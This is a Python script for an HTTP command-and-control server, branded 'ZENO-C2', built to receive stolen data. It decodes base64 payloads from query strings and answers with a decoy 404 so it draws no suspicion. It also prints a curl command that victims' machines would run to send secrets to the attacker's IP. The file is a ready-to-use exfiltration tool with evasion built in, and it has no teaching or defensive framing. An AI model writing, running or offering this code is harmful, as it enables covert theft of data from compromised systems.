from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import base64

class C2Handler(BaseHTTPRequestHandler):
    # Suppress standard logging to keep terminal clean
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        # Look for exfiltrated data in the URL (e.g., ?data=QmFzZTY0)
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)
        
        if 'data' in query:
            encoded_data = query['data'][0]
            try:
                decoded = base64.b64decode(encoded_data).decode('utf-8')
                print(f"[+] EXFIL RECEIVED ({self.client_address[0]}): {decoded}")
            except Exception:
                print(f"[!] INVALID EXFIL ({self.client_address[0]}): {encoded_data}")
        
        # Always return a normal looking 404 to avoid suspicion
        self.send_response(404)
        self.end_headers()

print("=============================================")
print("   📡 ZENO-C2: HTTP EXFILTRATION NODE")
print("=============================================\n")

port = 8080
server = HTTPServer(('0.0.0.0', port), C2Handler)
print(f"[*] C2 Server active on port {port}.")
print(f"[*] Target Command: curl http://<YOUR_IP>:{port}/?data=$(echo 'secret' | base64)")
print("[*] Waiting for beacons... (Ctrl+C to stop)\n")

try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\n[-] C2 Server offline.")
